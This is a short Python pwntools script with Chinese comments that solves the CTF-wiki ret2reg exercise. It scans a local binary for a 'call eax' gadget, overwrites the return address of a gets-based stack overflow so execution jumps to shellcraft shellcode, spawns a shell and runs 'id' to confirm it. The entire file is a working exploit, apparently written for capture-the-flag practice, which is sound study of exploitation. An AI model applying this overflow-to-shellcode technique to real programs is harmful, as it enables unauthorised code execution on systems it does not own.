#!/usr/bin/env python3
# ret2reg（CTF-wiki 中级 ROP）：gets 返回后 eax 指向缓冲区，
# 把返回地址覆盖成 call eax，直接跳到栈上的 shellcode（本程序栈可执行）。
from pwn import *
import time
from capstone import Cs, CS_ARCH_X86, CS_MODE_32
context.log_level='error'
context.arch='i386'
BIN='../src/ret2shellcode'
e=ELF(BIN)
md=Cs(CS_ARCH_X86, CS_MODE_32)
call_eax=None
for ins in md.disasm(e.read(e.symbols['vuln'], 0x100), e.symbols['vuln']):
    pass
# 在整个 .text 中找 call eax
text=e.get_section_by_name('.text')
for ins in md.disasm(e.read(text.header.sh_addr, text.header.sh_size), text.header.sh_addr):
    if ins.mnemonic=='call' and ins.op_str=='eax':
        call_eax=ins.address; break
assert call_eax, 'call eax not found'
print('call eax = 0x%x'%call_eax, file=sys.stderr)
shell=asm(shellcraft.sh())
payload=shell.ljust(112,b'\x90')+p32(call_eax)
io=process(BIN, env={})
io.sendline(payload)
time.sleep(0.4)
io.sendline(b'echo PWNED_RET2REG; id; exit')
print(io.recvall(timeout=5).decode('utf-8','replace'))